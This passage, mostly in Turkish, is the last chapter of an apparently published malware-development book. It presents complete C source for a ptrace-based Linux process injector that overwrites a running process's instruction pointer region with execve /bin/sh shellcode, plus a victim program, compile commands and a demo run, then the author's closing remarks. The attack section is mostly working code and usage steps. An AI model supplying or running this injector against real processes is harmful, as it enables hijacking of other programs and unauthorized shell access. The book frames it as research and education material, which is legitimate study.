ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
Yani, kod enjeksiyon "kötü amaçlı yazılımımızın" tam kaynak kodu şu şekildedir (hack.c):
/*
* hack.c
* practical example of linux process injection
* author @cocomelonc
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <unistd.h>

// read memory from the target process
void read_mem(pid_t target_pid, long addr, char *buffer, int len) {
union data_chunk {
long val;
char bytes[sizeof(long)];
} chunk;
int i = 0;
while (i < len / sizeof(long)) {
chunk.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + i * sizeof(long), NULL);
memcpy(buffer + i * sizeof(long), chunk.bytes, sizeof(long));
i++;
}
int remaining = len % sizeof(long);
if (remaining) {
chunk.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + i * sizeof(long), NULL);
memcpy(buffer + i * sizeof(long), chunk.bytes, remaining);
}
}

// write memory into the target process
void write_mem(pid_t target_pid, long addr, char *buffer, int len) {
union data_chunk {
long val;
char bytes[sizeof(long)];
} chunk;
int i = 0;
while (i < len / sizeof(long)) {
memcpy(chunk.bytes, buffer + i * sizeof(long), sizeof(long));
ptrace(PTRACE_POKEDATA, target_pid, addr + i * sizeof(long), chunk.val);
i++;
}
int remaining = len % sizeof(long);
if (remaining) {
memcpy(chunk.bytes, buffer + i * sizeof(long), remaining);
ptrace(PTRACE_POKEDATA, target_pid, addr + i * sizeof(long), chunk.val);
}
}

int main(int argc, char *argv[]) {
if (argc != 2) {
printf("usage: %s <target_pid>\n", argv[0]);
return 1;
}

pid_t target_pid = atoi(argv[1]);
char payload[] = "\x48\x31\xf6\x56\x48\xbf\x2f\x62"
"\x69\x6e\x2f\x2f\x73\x68\x57\x54"
"\x5f\x6a\x3b\x58\x99\x0f\x05"; // execve /bin/sh
int payload_len = sizeof(payload) - 1;
char original_code[payload_len];

struct user_regs_struct target_regs;

// attach to the target process
printf("attaching to process %d\n", target_pid);
if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) == -1) {
perror("failed to attach :(");
return 1;
}
waitpid(target_pid, NULL, 0);

// get the current registers
printf("reading process registers\n");
ptrace(PTRACE_GETREGS, target_pid, NULL, &target_regs);

// backup the memory at RIP
printf("backing up target memory\n");
read_mem(target_pid, target_regs.rip, original_code, payload_len);

// inject the payload
printf("injecting payload\n");
write_mem(target_pid, target_regs.rip, payload, payload_len);

// hijack execution
printf("hijacking process execution\n");
ptrace(PTRACE_CONT, target_pid, NULL, NULL);

// wait for the payload to execute
wait(NULL);

// restore the original code
printf("restoring original process memory\n");
write_mem(target_pid, target_regs.rip, original_code, payload_len);

// detach from the process
printf("detaching from process\n");
ptrace(PTRACE_DETACH, target_pid, NULL, NULL);

printf("injection complete\n");
return 0;
}
Ancak bir sorun var.Neden süreç enjeksiyon kodunda waitpid kullanıyoruz?
PTRACE_ATTACH ile bir sürece bağlandığımızda, hedef süreç hemen durmaz.
İşlem, işletim sistemi hata ayıklayıcının (enjeksiyon kodumuzun) kontrolü ele aldığını gösteren bir sinyal gönderene kadar çalışmaya devam eder.
waitpid kullanarak, hedef sürecin tamamen durduğundan emin olana kadar enjeksiyon kodumuzun çalışmasını engelleriz:
ptrace(PTRACE_ATTACH, target_pid, NULL, NULL);
waitpid(target_pid, NULL, 0);
waitpid olmadan, işletim sistemi hedef sürecin tamamen durduğunu garanti etmeden belleği okumaya veya değiştirmeye çalışabiliriz.Bu da belirsiz davranışlara neden olabilir.
Ayrıca, süreç enjeksiyonu sırasında genellikle enjekte edilen shellcode'un yürütmeyi tamamladığını tespit etmemiz gerekir.
Bunu yapmak için, int 0x3 gibi bir yazılım kesmesi kullanırız.
Bu, hedef işlemde bir SIGTRAP sinyali tetikleyerek süreci duraklatır ve waitpid aracılığıyla tekrar kontrolü ele almamızı sağlar.
Peki ya wait fonksiyonu?wait fonksiyonu nedir ve ne zaman kullanılır?
wait fonksiyonu, waitpid'in daha basit bir çeşididir.Herhangi bir alt işlemin durum değiştirmesini bekler.waitpid'in aksine, belirli bir ID belirtmemize veya gelişmiş seçenekleri kullanmamıza izin vermez.
Süreç enjeksiyonu bağlamında genellikle wait kullanmayız, çünkü belirli bir süreci (hedefimizi) kontrol etmek isteriz ve waitpid bunu sağlar.
Ancak, birden fazla alt işlem olduğunda ve hangi alt işlemin durum değiştirdiğini umursamıyorsak wait kullanılabilir.
Bu nedenle, waitpid'i stratejik bir şekilde kullanarak sorunsuz ve güvenilir bir süreç enjeksiyonu gerçekleştirebiliriz.
Basit bir payload kullandım: 
char payload[] = 
"\x48\x31\xf6\x56\x48\xbf\x2f\x62"
"\x69\x6e\x2f\x2f\x73\x68\x57\x54"
"\x5f\x6a\x3b\x58\x99\x0f\x05"; // execve /bin/sh
demo
Öncelikle, gösterim amacıyla bir "kurban" sürece ihtiyacımız var.

Sonsuz döngü içinde çalışan, belirli aralıklarla mesaj yazdıran basit bir "kurban" işlemi yazdım.Bu program, gerçek bir çalışan süreci simüle eder:
/*
* meow.c
* simple "victim" process for injection testing
* author @cocomelonc
* https://cocomelonc.github.io/malware/2024/11/22/linux-hacking-3.html
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
printf("victim process started. PID: %d\n", getpid());
while (1) {
printf("meow-meow... PID: %d\n", getpid());
sleep(5); // simulate periodic activity
}
return 0;
}
Kurban süreci derleyelim:
gcc meow.c -o meow
+++++++++++++++++++++++++++++++++++++++++++++++
ve hack.c enjeksiyon kodunu derleyelim:
gcc -z execstack hack.c -o hack
+++++++++++++++++++++++++++++++++++++++++++++++

Ubuntu 24.04 VM'de önce kurban süreci çalıştırın:
./meow
Kurban sürecinin yazdırdığı PID’yi not edin:
+++++++++++++++++++++++++++++++++++++++++++++++

Bizim örneğimizde PID = 5987.
Şimdi bu PID’yi hedef alarak enjeksiyon yapabiliriz. Örneğin:
./hack 5987
+++++++++++++++++++++++++++++++++++++++++++++++
Bu, kurban sürece bağlanarak payload'umuzu enjekte edecektir.Bu sırada kurban süreç çalışmaya devam eder:
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++
Gördüğünüz gibi, her şey mükemmel çalıştı! =..=
Son sözler
Bu pratik örnek, ptrace'in özel shellcode enjekte etmek ve bir işlemin yürütme akışını değiştirmek için nasıl kullanılabileceğini göstermektedir.


Elbette ptrace ile yapılan bu teknik yeni değil, ancak meşru işlevselliğin kötüye nasıl kullanılabileceğini vurgulamaktadır.
Umarım bu pratik örnek, kötü amaçlı yazılım araştırmacıları, Linux programcıları ve Linux çekirdek programlama ve kod enjeksiyon teknikleriyle ilgilenen herkes için faydalı olur.
Not: Linux ayrıca process_vm_readv() ve process_vm_writev() sistem çağrılarını sunar, bunlar işlem belleğini okumak ve yazmak için kullanılabilir.
ptrace
Linux malware development 1: intro to kernel hacking. Simple C example
Linux malware development 2: find process ID by name. Simple C example
Github’taki kaynak kod

101.Final
Alhamdulillah, bu kitabı yazmayı bitirdim ve hâlâ kızım Munira ile tedavi sürecimiz devam ediyor. Kitap yazmak her zaman zordur, hatta benim deneyimime rağmen oldukça zor oldu. İnşallah her şey iyi olacak. Ey Âlemlerin Rabbi Allah’ım, kızıma güç ver.
Kitabın adı neden böyle? MD - Malware Development anlamına gelir. MZ imzası, MS-DOS taşınabilir 16-bit EXE formatında kullanılan bir imzadır ve geriye dönük uyumluluk için günümüz PE dosyalarında hâlâ mevcuttur. Ayrıca, MD MZ, My Daughter Munira Zhassulankyzy anlamına gelir.
Bu kitabın en az bir kişiye bile bilgi edinmesi ve siber güvenlik bilimi öğrenmesi konusunda yardımcı olursa çok mutlu olacağım. Kitap ağırlıklı olarak pratik odaklıdır.
Arkadaşlarıma ve meslektaşlarıma derin minnettarlığımı ifade etmek isterim.

Özel teşekkürler Anna Tsyganova ve Duman Sembayev’e.
Tüm örnekler yalnızca eğitim ve araştırma amaçlı pratik vakalardır.
Vakit ayırdığınız için teşekkürler, happy hacking ve hoşça kalın!
Not: Tüm çizimler ve ekran görüntüleri bana aittir.


KASIM 2024
TEŞEKKÜRLER!
COCOMELONC
ZHASSULAN ZHUSSUPOV


Bu kitabın satışından elde edilen gelir, kızım Munira'nın tedavisi ve hayır fonu için kullanılacaktır.
TÜM HAKLARI SAKLIDIR



